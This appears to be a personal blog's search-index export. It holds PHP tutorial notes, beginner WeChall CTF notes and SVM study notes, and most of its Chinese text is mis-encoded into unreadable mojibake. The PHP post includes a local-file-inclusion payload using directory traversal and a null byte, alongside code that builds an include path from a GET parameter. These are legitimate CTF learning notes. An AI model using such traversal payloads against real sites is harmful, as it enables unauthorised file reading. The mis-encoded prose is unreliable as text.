åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œç»“æœä»¥çº¯HTMLæ ¼å¼è¿”å›åˆ°æµè§ˆå™¨PHPæ–‡ä»¶çš„æ‰©å±•åä¸ºâ€œ .phpâ€","text":"ä»€ä¹ˆæ˜¯PHPæ–‡ä»¶ï¼ŸPHPæ–‡ä»¶å¯ä»¥åŒ…å«æ–‡æœ¬ï¼ŒHTMLï¼ŒCSSï¼ŒJavaScriptå’ŒPHPä»£ç PHPä»£ç åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œç»“æœä»¥çº¯HTMLæ ¼å¼è¿”å›åˆ°æµè§ˆå™¨PHPæ–‡ä»¶çš„æ‰©å±•åä¸ºâ€œ .phpâ€ PHPå¯ä»¥åšä»€ä¹ˆï¼ŸPHPå¯ä»¥ç”ŸæˆåŠ¨æ€é¡µé¢å†…å®¹PHPå¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºï¼Œæ‰“å¼€ï¼Œè¯»å–ï¼Œå†™å…¥ï¼Œåˆ é™¤å’Œå…³é—­æ–‡ä»¶PHPå¯ä»¥æ”¶é›†è¡¨å•æ•°æ®PHPå¯ä»¥å‘é€å’Œæ¥æ”¶CookiePHPå¯ä»¥æ·»åŠ ï¼Œåˆ é™¤ï¼Œä¿®æ”¹æ•°æ®åº“ä¸­çš„æ•°æ®PHPå¯ç”¨äºæ§åˆ¶ç”¨æˆ·è®¿é—®PHPå¯ä»¥åŠ å¯†æ•°æ®ä½¿ç”¨PHPï¼Œæ‚¨ä¸ä»…å¯ä»¥è¾“å‡ºHTMLã€‚æ‚¨å¯ä»¥è¾“å‡ºå›¾åƒï¼ŒPDFæ–‡ä»¶ç”šè‡³Flashç”µå½±ã€‚æ‚¨è¿˜å¯ä»¥è¾“å‡ºä»»ä½•æ–‡æœ¬ï¼Œä¾‹å¦‚XHTMLå’ŒXMLã€‚ PHPè„šæœ¬å¯ä»¥æ”¾åœ¨æ–‡æ¡£ä¸­çš„ä»»ä½•ä½ç½®ã€‚PHPè„šæœ¬çš„å¼€å¤´&lt;?phpå’Œç»“å°¾æ˜¯?&gt;ï¼š&lt;?php// PHP code goes here?&gt;PHPæ–‡ä»¶çš„é»˜è®¤æ–‡ä»¶æ‰©å±•åæ˜¯â€œ .phpâ€ã€‚ä¸€ä¸ªPHPæ–‡ä»¶é€šå¸¸åŒ…å«HTMLæ ‡è®°å’Œä¸€äº›PHPè„šæœ¬ä»£ç ã€‚ PHPè¯­å¥ä»¥åˆ†å·ï¼ˆ;ï¼‰ç»“å°¾ã€‚ åœ¨PHPä¸­ï¼Œå…³é”®å­—ï¼ˆä¾‹å¦‚ifï¼Œ elseï¼Œwhileï¼Œ echoç­‰ï¼‰ï¼Œç±»ï¼Œå‡½æ•°ï¼Œå’Œç”¨æˆ·å®šä¹‰çš„å‡½æ•°æ˜¯ä¸åŒºåˆ†å¤§å°å†™ã€‚ æ‰€æœ‰å˜é‡åç§°å‡åŒºåˆ†å¤§å°å†™ï¼ comment//#/ / åœ¨PHPä¸­ï¼Œå˜é‡ä»¥$ç¬¦å·å¼€å¤´ï¼Œåè·Ÿå˜é‡åç§° ä¸å…¶ä»–ç¼–ç¨‹è¯­è¨€ä¸åŒï¼ŒPHPæ²¡æœ‰ç”¨äºå£°æ˜å˜é‡çš„å‘½ä»¤ã€‚å®ƒæ˜¯åœ¨æ‚¨é¦–æ¬¡ä¸ºå…¶åˆ†é…å€¼æ—¶åˆ›å»ºçš„ã€‚ &lt;?php$txt = â€œW3Schools.comâ€;echo â€œI love $txt!â€;?&gt; &lt;?php$txt = â€œW3Schools.comâ€;echo â€œI love â€œ . $txt . â€œ!â€;?&gt; &lt;?php$x = 5;$y = 4;echo $x + $y;?&gt; åœ¨å‡½æ•°å¤–éƒ¨å£°æ˜çš„å˜é‡å…·æœ‰å…¨å±€èŒƒå›´ï¼Œå¹¶ä¸”åªèƒ½åœ¨å‡½æ•°å¤–éƒ¨è®¿é—®åœ¨å‡½æ•°å†…å£°æ˜çš„å˜é‡å…·æœ‰å±€éƒ¨èŒƒå›´ï¼Œåªèƒ½åœ¨è¯¥å‡½æ•°å†…è®¿é—®globalå…³é”®å­—ç”¨äºåœ¨å‡½æ•°å†…éƒ¨è®¿é—®ä¸€ä¸ªå…¨å±€å˜é‡ã€‚ä¸ºæ­¤ï¼Œè¯·globalåœ¨å˜é‡ä¹‹å‰ï¼ˆåœ¨å‡½æ•°å†…éƒ¨ï¼‰ä½¿ç”¨å…³é”®å­—&lt;?php$x = 5;$y = 10;function myTest() { global $x, $y; $y = $x + $y;}myTest();echo $y; // outputs 15?&gt; PHP also stores all global variables in an array called $GLOBALS[index]. The index holds the name of the variable. This array is also accessible from within functions and can be used to update global variables directly. &lt;?php$x = 5;$y = 10;function myTest() { $GLOBALS[â€˜yâ€™] = $GLOBALS[â€˜xâ€™] + $GLOBALS[â€˜yâ€™];}myTest();echo $y; // outputs 15?&gt; é€šå¸¸ï¼Œå½“ä¸€ä¸ªå‡½æ•°å®Œæˆ/æ‰§è¡Œæ—¶ï¼Œå®ƒçš„æ‰€æœ‰å˜é‡éƒ½ä¼šè¢«åˆ é™¤ã€‚ä½†æ˜¯ï¼Œæœ‰æ—¶æˆ‘ä»¬å¸Œæœ›ä¸åˆ é™¤å±€éƒ¨å˜é‡ã€‚æˆ‘ä»¬éœ€è¦å®ƒæ¥åšè¿›ä¸€æ­¥çš„å·¥ä½œã€‚ä¸ºæ­¤ï¼Œè¯·staticåœ¨é¦–æ¬¡å£°æ˜å˜é‡æ—¶ä½¿ç”¨å…³é”®å­—ç„¶åï¼Œæ¯æ¬¡è°ƒç”¨è¯¥å‡½æ•°æ—¶ï¼Œè¯¥å˜é‡ä»å°†å…·æœ‰è‡ªä¸Šæ¬¡è°ƒç”¨è¯¥å‡½æ•°ä»¥æ¥æ‰€åŒ…å«çš„ä¿¡æ¯ã€‚æ³¨æ„ï¼šè¯¥å˜é‡ä»ç„¶æ˜¯å‡½æ•°çš„å±€éƒ¨å˜é‡ã€‚ å·®å¼‚å¾ˆå°ï¼šechoæ²¡æœ‰è¿”å›å€¼ï¼Œè€Œprintè¿”å›å€¼ä¸º1ï¼Œå› æ­¤å¯ä»¥åœ¨è¡¨è¾¾å¼ä¸­ä½¿ç”¨ã€‚echoå¯ä»¥é‡‡ç”¨å¤šä¸ªå‚æ•°ï¼ˆå°½ç®¡è¿™ç§ç”¨æ³•å¾ˆå°‘è§ï¼‰ï¼Œè€Œprintå¯ä»¥é‡‡ç”¨ä¸€ä¸ªå‚æ•°ã€‚echoæ¯”å¿«ä¸€ç‚¹printã€‚ &lt;?phpecho â€œPHP is Fun!â€œ;echo â€œHello world!â€œ;echo â€œIâ€™m about to learn PHP!â€œ;echo â€œThis â€œ, â€œstring â€œ, â€œwas â€œ, â€œmade â€œ, â€œwith multiple parameters.â€;?&gt; å­—ç¬¦ä¸²å¯ä»¥æ˜¯å¼•å·å†…çš„ä»»ä½•æ–‡æœ¬ã€‚å¯ä»¥ä½¿ç”¨å•å¼•å·æˆ–åŒå¼•å·æ•´æ•°æ•°æ®ç±»å‹æ˜¯-2,147,483,648å’Œ2,147,483,647ä¹‹é—´çš„éåè¿›åˆ¶æ•°ã€‚PHP var_dumpï¼ˆï¼‰å‡½æ•°è¿”å›æ•°æ®ç±»å‹å’Œå€¼ &lt;?php$cars = array(â€œVolvoâ€,â€BMWâ€,â€Toyotaâ€);var_dump($cars);?&gt; é¦–å…ˆï¼Œæˆ‘ä»¬å¿…é¡»å£°æ˜ä¸€ä¸ªå¯¹è±¡ç±»ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬ä½¿ç”¨classå…³é”®å­—ã€‚ç±»æ˜¯å¯ä»¥åŒ…å«å±æ€§å’Œæ–¹æ³•çš„ç»“æ„ï¼š&lt;?phpclass Car { function Car() { $this-&gt;model = â€œVWâ€; }}// create an object$herbie = new Car();// show object propertiesecho $herbie-&gt;model;?&gt; å¦‚æœåˆ›å»ºçš„å˜é‡æ²¡æœ‰å€¼ï¼Œåˆ™ä¼šè‡ªåŠ¨ä¸ºå…¶åˆ†é…å€¼NULLã€‚ä¹Ÿå¯ä»¥é€šè¿‡å°†å€¼è®¾ç½®ä¸ºNULLæ¥æ¸…ç©ºå˜é‡ï¼š å…³äºPHPçš„æ³¨æ„äº‹é¡¹ä¹‹ä¸€æ˜¯å®ƒæä¾›äº†è‡ªåŠ¨æ•°æ®ç±»å‹è½¬æ¢ã€‚å› æ­¤ï¼Œå¦‚æœå°†æ•´æ•°å€¼åˆ†é…ç»™å˜é‡ï¼Œåˆ™è¯¥å˜é‡çš„ç±»å‹å°†è‡ªåŠ¨ä¸ºæ•´æ•°ã€‚ç„¶åï¼Œå¦‚æœå°†å­—ç¬¦ä¸²åˆ†é…ç»™ç›¸åŒçš„å˜é‡ï¼Œåˆ™ç±»å‹å°†æ›´æ”¹ä¸ºå­—ç¬¦ä¸²ã€‚ æ•´æ•°å¯ä»¥ä»¥ä¸‰ç§æ ¼å¼æŒ‡å®šï¼šåè¿›åˆ¶ï¼ˆåŸºäº10çš„ï¼‰ï¼Œåå…­è¿›åˆ¶ï¼ˆåŸºäº16çš„-å¸¦æœ‰0xå‰ç¼€ï¼‰æˆ–å…«è¿›åˆ¶ï¼ˆåŸºäº8çš„-å¸¦æœ‰0å‰ç¼€ï¼‰ ï¼ˆintï¼‰ï¼Œï¼ˆintegerï¼‰æˆ–intvalï¼ˆï¼‰å‡½æ•°é€šå¸¸ç”¨äºå°†å€¼è½¬æ¢ä¸ºæ•´æ•°ã€‚ æœ‰æ•ˆçš„å¸¸é‡åç§°ä»¥å­—æ¯æˆ–ä¸‹åˆ’çº¿å¼€å¤´ï¼ˆå¸¸é‡åç§°å‰æ²¡æœ‰$ç¬¦å·ï¼‰ã€‚ æ³¨æ„ï¼šä¸å˜é‡ä¸åŒï¼Œå¸¸é‡åœ¨æ•´ä¸ªè„šæœ¬ä¸­è‡ªåŠ¨ä¸ºå…¨å±€å˜é‡ã€‚define(name, value, case-insensitive)åœ¨PHP7ä¸­ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨define()å‡½æ•°åˆ›å»ºä¸€ä¸ªArrayå¸¸é‡ã€‚ . Concatenation $txt1 . $txt2 Concatenation of $txt1 and $txt2.= Concatenation assignment $txt1 .= $txt2 Appends $txt2 to $txt1 &lt;?php$t = date(â€œHâ€); if ($t &lt; â€œ20â€) { echo â€œHave a good day!â€;}?&gt; è¯¥foreachå¾ªç¯ä»…é€‚ç”¨äºæ•°ç»„ï¼Œç”¨äºå¾ªç¯éå†æ•°ç»„ä¸­çš„æ¯ä¸ªé”®/å€¼å¯¹ã€‚å¥æ³•foreach ($array as $value) { code to be executed;}å¯¹äºæ¯æ¬¡å¾ªç¯è¿­ä»£ï¼Œå½“å‰æ•°ç»„å…ƒç´ çš„å€¼éƒ½åˆ†é…ç»™$ valueï¼Œå¹¶ä¸”æ•°ç»„æŒ‡é’ˆç§»åŠ¨ä¸€ä¸ªï¼Œç›´åˆ°åˆ°è¾¾æœ€åä¸€ä¸ªæ•°ç»„å…ƒç´ ã€‚ è¦æŒ‡å®šï¼Œstrictæˆ‘ä»¬éœ€è¦è®¾ç½®declare(strict_types=1);ã€‚è¿™å¿…é¡»åœ¨PHPæ–‡ä»¶çš„ç¬¬ä¸€è¡Œã€‚è¿™ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä¸ªåœ¨å£°æ˜å‡½æ•°æ—¶æŒ‡å®šæ‰€éœ€æ•°æ®ç±»å‹çš„é€‰é¡¹ï¼Œå¹¶ä¸”é€šè¿‡æ·»åŠ strict å£°æ˜ï¼Œå¦‚æœæ•°æ®ç±»å‹ä¸åŒ¹é…ï¼Œå®ƒå°†æŠ›å‡ºâ€œè‡´å‘½é”™è¯¯â€ã€‚ &lt;?php declare(strict_types=1); // strict requirementfunction addNumbers(float $a, float $b) : float { return $a + $b;}echo addNumbers(1.2, 5.2);?&gt; &lt;?php declare(strict_types=1); // strict requirementfunction addNumbers(float $a, float $b) : int { return (int)($a + $b);}echo addNumbers(1.2, 5.2);?&gt; &lt;?php$cars = array(â€œVolvoâ€, â€œBMWâ€, â€œToyotaâ€);echo â€œI like â€œ . $cars[0] . â€œ, â€œ . $cars[1] . â€œ and â€œ . $cars[2] . â€œ.â€;?&gt; å…³è”æ•°ç»„æ˜¯ä½¿ç”¨åˆ†é…ç»™å®ƒä»¬çš„å‘½åé”®çš„æ•°ç»„ã€‚æœ‰ä¸¤ç§åˆ›å»ºå…³è”æ•°ç»„çš„æ–¹æ³•ï¼š$age = array(â€œPeterâ€=&gt;â€35â€, â€œBenâ€=&gt;â€37â€, â€œJoeâ€=&gt;â€43â€);è¦ä¹ˆï¼š$age[â€˜Peterâ€™] = â€œ35â€;$age[â€˜Benâ€™] = â€œ37â€;$age[â€˜Joeâ€™] = â€œ43â€;ç„¶åå¯ä»¥åœ¨è„šæœ¬ä¸­ä½¿ç”¨å‘½åçš„é”®ï¼š $cars = array ( array(â€œVolvoâ€,22,18), array(â€œBMWâ€,15,13), array(â€œSaabâ€,5,2), array(â€œLand Roverâ€,17,15));&lt;?phpecho $cars[0][0].â€: In stock: â€œ.$cars[0][1].â€, sold: â€œ.$cars[0][2].â€.â€œ;echo $cars[1][0].â€: In stock: â€œ.$cars[1][1].â€, sold: â€œ.$cars[1][2].â€.â€œ;echo $cars[2][0].â€: In stock: â€œ.$cars[2][1].â€, sold: â€œ.$cars[2][2].â€.â€œ;echo $cars[3][0].â€: In stock: â€œ.$cars[3][1].â€, sold: â€œ.$cars[3][2].â€.â€œ;?&gt; sort() -ä»¥å‡åºæ’åˆ—æ•°ç»„rsort() -ä»¥é™åºæ’åˆ—æ•°ç»„asort() -æ ¹æ®å€¼ä»¥å‡åºå¯¹å…³è”æ•°ç»„è¿›è¡Œæ’åºksort() -æ ¹æ®é”®ä»¥å‡åºå¯¹å…³è”æ•°ç»„è¿›è¡Œæ’åºarsort() -æ ¹æ®å€¼ä»¥é™åºå¯¹å…³è”æ•°ç»„è¿›è¡Œæ’åºkrsort() -æ ¹æ®é”®ä»¥é™åºå¯¹å…³è”æ•°ç»„è¿›è¡Œæ’åº ç”¨äºåœ¨ä½¿ç”¨method =â€œ postâ€æäº¤HTMLè¡¨å•åæ”¶é›†è¡¨å•æ•°æ®ã€‚$ _POSTä¹Ÿå¹¿æ³›ç”¨äºä¼ é€’å˜é‡ã€‚$_SERVER[â€˜PHP_SELFâ€™] Returns the filename of the currently executing script$_SERVER[â€˜REQUEST_METHODâ€™] Returns the request method used to access the page (such as POST)PHP $ _GETæ˜¯ä¸€ä¸ªPHPè¶…çº§å…¨å±€å˜é‡ï¼Œç”¨äºåœ¨ä½¿ç”¨method =â€œ getâ€æäº¤HTMLè¡¨å•åæ”¶é›†è¡¨å•æ•°æ®ã€‚$ _GETè¿˜å¯ä»¥æ”¶é›†åœ¨URLä¸­å‘é€çš„æ•°æ®ã€‚ä½¿ç”¨GETæ–¹æ³•ä»è¡¨å•å‘é€çš„ä¿¡æ¯å¯¹æ‰€æœ‰äººéƒ½æ˜¯å¯è§çš„ï¼ˆæ‰€æœ‰å˜é‡åå’Œå€¼éƒ½æ˜¾ç¤ºåœ¨URLä¸­ï¼‰ã€‚GETå¯¹å‘é€çš„ä¿¡æ¯é‡ä¹Ÿæœ‰é™åˆ¶ã€‚é™åˆ¶çº¦ä¸º2000ä¸ªå­—ç¬¦ã€‚ä½†æ˜¯ï¼Œç”±äºå˜é‡æ˜¾ç¤ºåœ¨URLä¸­ï¼Œå› æ­¤å¯ä»¥ä¸ºé¡µé¢æ·»åŠ ä¹¦ç­¾ã€‚åœ¨æŸäº›æƒ…å†µä¸‹è¿™å¯èƒ½å¾ˆæœ‰ç”¨ã€‚GETå¯ä»¥ç”¨äºå‘é€éæ•æ„Ÿæ•°æ®ã€‚æ³¨æ„ï¼šç»å¯¹ä¸è¦å°†GETç”¨äºå‘é€å¯†ç æˆ–å…¶ä»–æ•æ„Ÿä¿¡æ¯ï¼ ä½¿ç”¨POSTæ–¹æ³•ä»è¡¨å•å‘é€çš„ä¿¡æ¯å¯¹äºå…¶ä»–äººæ˜¯ä¸å¯è§çš„ ï¼ˆæ‰€æœ‰åç§°/å€¼éƒ½åµŒå…¥åœ¨HTTPè¯·æ±‚çš„æ­£æ–‡ä¸­ï¼‰ï¼Œå¹¶ä¸”å¯¹è¦å‘é€çš„ä¿¡æ¯é‡æ²¡æœ‰é™åˆ¶ã€‚æ­¤å¤–ï¼ŒPOSTæ”¯æŒé«˜çº§åŠŸèƒ½ï¼Œä¾‹å¦‚åœ¨å°†æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨æ—¶æ”¯æŒå¤šéƒ¨åˆ†äºŒè¿›åˆ¶è¾“å…¥ã€‚ä½†æ˜¯ï¼Œç”±äºå˜é‡æœªæ˜¾ç¤ºåœ¨URLä¸­ï¼Œå› æ­¤æ— æ³•ä¸ºé¡µé¢æ·»åŠ ä¹¦ç­¾ã€‚ $ _ SERVER [â€œ PHP_SELFâ€]å°†æäº¤çš„è¡¨å•æ•°æ®å‘é€åˆ°é¡µé¢æœ¬èº«ï¼Œè€Œä¸æ˜¯è·³è½¬åˆ°å¦ä¸€ä¸ªé¡µé¢ã€‚è¿™æ ·ï¼Œç”¨æˆ·å°†åœ¨ä¸è¡¨å•ç›¸åŒçš„é¡µé¢ä¸Šæ”¶åˆ°é”™è¯¯æ¶ˆæ¯ã€‚htmlspecialcharsï¼ˆï¼‰å‡½æ•°å°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸ºHTMLå®ä½“ã€‚è¿™æ„å‘³ç€å®ƒå°†ç”¨ï¼†lt;æ›¿æ¢&lt;å’Œ&gt;ä¹‹ç±»çš„HTMLå­—ç¬¦ã€‚å’Œï¼†gt;ã€‚è¿™æ ·å¯ä»¥é˜²æ­¢æ”»å‡»è€…é€šè¿‡ä»¥è¡¨æ ¼å½¢å¼æ³¨å…¥HTMLæˆ–Javascriptä»£ç ï¼ˆè·¨ç«™ç‚¹è„šæœ¬æ”»å‡»ï¼‰æ¥åˆ©ç”¨ä»£ç ã€‚ ä»ç”¨æˆ·è¾“å…¥æ•°æ®ä¸­åˆ é™¤ä¸å¿…è¦çš„å­—ç¬¦ï¼ˆå¤šä½™çš„ç©ºæ ¼ï¼Œåˆ¶è¡¨ç¬¦ï¼Œæ¢è¡Œç¬¦ï¼‰ï¼ˆä½¿ç”¨PHP trimï¼ˆï¼‰å‡½æ•°ï¼‰ä»ç”¨æˆ·è¾“å…¥æ•°æ®ä¸­åˆ é™¤åæ–œæ ï¼ˆ\\ï¼‰ï¼ˆä½¿ç”¨PHP stripslashesï¼ˆï¼‰å‡½æ•°ï¼‰ä½¿ç”¨PHP empty() å‡½æ•° 12345678910111213&lt;form method=\"post\" action=\"&lt;?php echo htmlspecialchars($_SERVER[\"PHP_SELF\"]);?&gt;\"&gt;Name: &lt;input type=\"text\" name=\"name\"&gt;&lt;span class=\"error\"&gt;* &lt;?php echo $nameErr;?&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;E-mail:&lt;input type=\"text\" name=\"email\"&gt;&lt;span class=\"error\"&gt;* &lt;?php echo $emailErr;?&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;Website:&lt;input type=\"text\" name=\"website\"&gt;&lt;span class=\"error\"&gt;&lt;?php echo $websiteErr;?&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;Comment: &lt;textarea name=\"comment\" rows=\"5\" cols=\"40\"&gt; preg_matchï¼ˆï¼‰å‡½æ•°åœ¨å­—ç¬¦ä¸²ä¸­æœç´¢æ¨¡å¼ï¼Œå¦‚æœå­˜åœ¨æ¨¡å¼ï¼Œåˆ™è¿”å›trueï¼Œå¦åˆ™è¿”å›falseã€‚æ­£åˆ™è¡¨è¾¾å¼ includeå’Œrequireè¯­å¥ç›¸åŒï¼Œä½†å¤±è´¥æ—¶é™¤å¤–ï¼šrequire å°†äº§ç”Ÿè‡´å‘½é”™è¯¯ï¼ˆE_COMPILE_ERRORï¼‰å¹¶åœæ­¢è„šæœ¬ include åªä¼šäº§ç”Ÿè­¦å‘Šï¼ˆE_WARNINGï¼‰å¹¶ä¸”è„šæœ¬å°†ç»§ç»­è¯¥readfile()å‡½æ•°è¯»å–æ–‡ä»¶å¹¶å°†å…¶å†™å…¥è¾“å‡ºç¼“å†²åŒºã€‚ &lt;?php$myfile = fopen(â€œwebdictionary.txtâ€, â€œrâ€) or die(â€œUnable to open file!â€);echo fread($myfile,filesize(â€œwebdictionary.txtâ€));fclose($myfile);?&gt; è¯¥fclose()åŠŸèƒ½ç”¨äºå…³é—­æ‰“å¼€çš„æ–‡ä»¶ã€‚ç»“æŸæ‰€æœ‰æ–‡ä»¶åï¼Œå…³é—­æ‰€æœ‰æ–‡ä»¶æ˜¯ä¸€ç§è‰¯å¥½çš„ç¼–ç¨‹ä¹ æƒ¯ã€‚æ‚¨ä¸å¸Œæœ›åœ¨æœåŠ¡å™¨ä¸Šåˆ°å¤„è¿è¡Œæ‰“å¼€çš„æ–‡ä»¶å ç”¨èµ„æºï¼ è¯¥feof()åŠŸèƒ½æ£€æŸ¥æ˜¯å¦å·²è¾¾åˆ°â€œæ–‡ä»¶ç»“å°¾â€ï¼ˆEOFï¼‰ã€‚ è¯¥fopen()å‡½æ•°è¿˜ç”¨äºåˆ›å»ºæ–‡ä»¶ã€‚å¯èƒ½æœ‰äº›æ··ä¹±ï¼Œä½†æ˜¯åœ¨PHPä¸­ï¼Œä½¿ç”¨ä¸æ‰“å¼€æ–‡ä»¶ç›¸åŒçš„åŠŸèƒ½åˆ›å»ºæ–‡ä»¶ã€‚ $filename = â€˜pages/â€˜.(isset($_GET[â€œfileâ€])$_GET[â€œfileâ€]:â€welcomeâ€).â€™.htmlâ€™; ï¼Ÿ ï¼š issetï¼ˆï¼‰å‡½æ•°æ£€æŸ¥æ˜¯å¦è®¾ç½®äº†å˜é‡ï¼Œè¿™æ„å‘³ç€å¿…é¡»å£°æ˜è¯¥å˜é‡å¹¶ä¸”è¯¥å˜é‡ä¸èƒ½ä¸ºNULLã€‚dieï¼ˆï¼‰å‡½æ•°æ˜¯exitï¼ˆï¼‰å‡½æ•°çš„åˆ«åã€‚ evalï¼ˆï¼‰å‡½æ•°å°†å­—ç¬¦ä¸²è¯„ä¼°ä¸ºPHPä»£ç ã€‚dirnameï¼ˆï¼‰å‡½æ•°è¿”å›çˆ¶ç›®å½•çš„è·¯å¾„ã€‚in_arrayï¼ˆï¼‰å‡½æ•°åœ¨æ•°ç»„ä¸­æœç´¢ç‰¹å®šå€¼ã€‚æ³¨æ„ï¼šå¦‚æœæœç´¢å‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”ç±»å‹å‚æ•°è®¾ç½®ä¸ºTRUEï¼Œåˆ™æœç´¢åŒºåˆ†å¤§å°å†™ã€‚ WECHALL LFI?file=page/jhkd.html?file=../../solution.php%00%00 åçš„å­—ç¬¦ä¸ç®—ï¼Œå·²ç»æ›´æ”¹../ éå†ç›®å½• switch ($which) { case 0: case 1: case 2: require_once $which.â€™.phpâ€™; break; default: echo GWF_HTML::error(â€˜PHP-0817â€™, â€˜Hacker NoNoNo!â€™, false); break; }which=0,1,2 éƒ½æ‰§è¡Œrequire_once","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://finsenty54.github.io/tags/CTF/"}]},{"title":"CTFå…¥é—¨ WECALL","slug":"CTFå…¥é—¨ WECALL","date":"2020-05-15T11:24:57.000Z","updated":"2020-05-15T11:26:23.799Z","comments":true,"path":"2020/05/15/CTFå…¥é—¨ WECALL/","link":"","permalink":"http://finsenty54.github.io/2020/05/15/CTFå…¥é—¨ WECALL/","excerpt":"åˆå­¦CTF å…¥é—¨å¤ªéš¾ wecall challenges è§£å†³æ–¹æ³•training steganoI$cat xxx.bmphttps://www.tecmint.com/13-basic-cat-command-examples-in-linux/ Crypto - Caesar Ipythonå‡½æ•° list() ord() chr()","text":"åˆå­¦CTF å…¥é—¨å¤ªéš¾ wecall challenges è§£å†³æ–¹æ³•training steganoI$cat xxx.bmphttps://www.tecmint.com/13-basic-cat-command-examples-in-linux/ Crypto - Caesar Ipythonå‡½æ•° list() ord() chr() WWW-Robotsrobots.txtThe robots.txt file is used by web crawlers to check if they are allowed to crawl and index your website or only parts of it.Sometimes these files reveal the directory structure instead protecting the content from being crawled. URL ENCODEURL encoding replaces unsafe ASCII characters with a â€œ%â€ followed by two hexadecimal digits. åå…­è¿›åˆ¶URLs cannot contain spaces. URL encoding normally replaces a space with a plus (+) sign or with %20.URLs can only be sent over the Internet using the ASCII character-set. python 3.7from urllib.parse import unquotetar -xf è§£å‹ç¼© ï¼Ÿè‡ªåŠ¨è¯†åˆ«java -jar Training: Programming 1urllib.request urlopenè¿”å›çš„æ˜¯äºŒè¿›åˆ¶æ•°æ®ï¼Œdecode(â€˜utf-8â€™)è§£ç  æ­£åˆ™è¡¨è¾¾å¼https://zh.wikipedia.org/wiki/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F â€˜weshallâ€™ wechall4?.(jpg|gif|tiff|bmp|png)","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://finsenty54.github.io/tags/CTF/"}]},{"title":"SVMå­¦ä¹ ç¬”è®°2","slug":"SVMå­¦ä¹ ç¬”è®°2","date":"2020-04-01T12:17:15.000Z","updated":"2020-04-01T12:18:45.372Z","comments":true,"path":"2020/04/01/SVMå­¦ä¹ ç¬”è®°2/","link":"","permalink":"http://finsenty54.github.io/2020/04/01/SVMå­¦ä¹ ç¬”è®°2/","excerpt":"å‡¸äºŒæ¬¡è§„åˆ’ == å¼€å£å‘ä¸‹ åˆ†ç±»é æ”¯æ’‘å‘é‡è®¡ç®— å…¶ a~=0","text":"å‡¸äºŒæ¬¡è§„åˆ’ == å¼€å£å‘ä¸‹ åˆ†ç±»é æ”¯æ’‘å‘é‡è®¡ç®— å…¶ a~=0 hard-margin soft-margin å®¹å¿ä¸€äº›è¯¯å·®æ¯ä¸ªå®¹å¿å€¼å’Œå¸Œæœ›æœ€å° KKTå¸®åŠ©ç¡®å®ša ï¼Œ Lå‡½æ•°ç³»æ•° æ‹‰æ ¼æœ—æ—¥ K-fold æ•°æ®åˆ†æˆkä»½è¿›è¡Œtrain testè·å–æœ€ä½³å‚æ•° è°ƒç”¨crossvalå°±æ˜¯è¦æ‰¾åˆ°å‚æ•°C(æƒ©ç½šç³»æ•°)å’Œsigmaï¼Œä½¿è¯¯åˆ†ç‡mcræœ€å° one vs oneå¤šç±»åˆ¤å®šæŠ•ç¥¨ one vs allæœ‰ç¬¦å·è·ç¦»å–æœ€å¤§ æ‰å‘ç° matlab %%%%è¿è¡ŒèŠ‚ ä»£ç å‚è€ƒ http://www.matlabsky.com/thread-11026-1-1.html fitcsvm()ä½¿ç”¨&#39;OptimizeHyperparameters&#39;- è¦ä¼˜åŒ–çš„å‚æ•° å’Œ&#39;HyperparameterOptimizationOptions&#39; - ä¼˜åŒ–çš„é€‰é¡¹æ¥æ‰¾åˆ°æœ€ä½³sigma å’Œ C ç½šå› å­","categories":[],"tags":[{"name":"SVM","slug":"SVM","permalink":"http://finsenty54.github.io/tags/SVM/"}]},{"title":"SVMå­¦ä¹ ç¬”è®°1","slug":"SVMå­¦ä¹ ç¬”è®°1","date":"2020-03-31T09:06:21.000Z","updated":"2020-03-31T11:35:13.640Z","comments":true,"path":"2020/03/31/SVMå­¦ä¹ ç¬”è®°1/","link":"","permalink":"http://finsenty54.github.io/2020/03/31/SVMå­¦ä¹ ç¬”è®°1/","excerpt":"https://m.youtube.com/watch?v=Hu71tIm1iX0&amp;list=PLt0SBi1p7xrRKE2us8doqryRou6eDYEOy&amp;index=9&amp;t=0så‚è€ƒè§†é¢‘è¯¾ç¨‹ mvnrndï¼ˆï¼‰äº§ç”Ÿç‰¹å®šå‡å€¼å’Œåæ–¹å·®çš„çŸ©é˜µ","text":"https://m.youtube.com/watch?v=Hu71tIm1iX0&amp;list=PLt0SBi1p7xrRKE2us8doqryRou6eDYEOy&amp;index=9&amp;t=0så‚è€ƒè§†é¢‘è¯¾ç¨‹ mvnrndï¼ˆï¼‰äº§ç”Ÿç‰¹å®šå‡å€¼å’Œåæ–¹å·®çš„çŸ©é˜µ kenel çŸ©é˜µè¦æœ‰é™æ­£åŠå®šï¼Œkenelå‡½æ•°ï¼šR^d-&gt;R å¸¸è§kenel å¯ä»¥è‡ªå·±æ„é€  REPRODUCING KENEL MAPç”±kenel æ¨å‡º feature mapping ä»¥åŠå…¶é€† Principal Component Analysis ä¸»æˆåˆ†åˆ†æKPCA Linear Discriminant Analysis ç·šæ€§å€åˆ¥åˆ†ææŠ•å½±åæ ‡ï¼šå†…ç§¯*vå»£ç¾©å€åˆ¥åˆ†æ(Generalized Discriminant Analysis)ã€‚ KKT svmè¯æ˜ä¸­ä¼šç”¨åˆ° å…¶ä»– https://ww2.mathworks.cn/help/matlab/data-type-conversion.htmlmatlab æ•°æ®ç±»å‹è½¬æ¢ &lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/Ap0huJwyT7g&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; 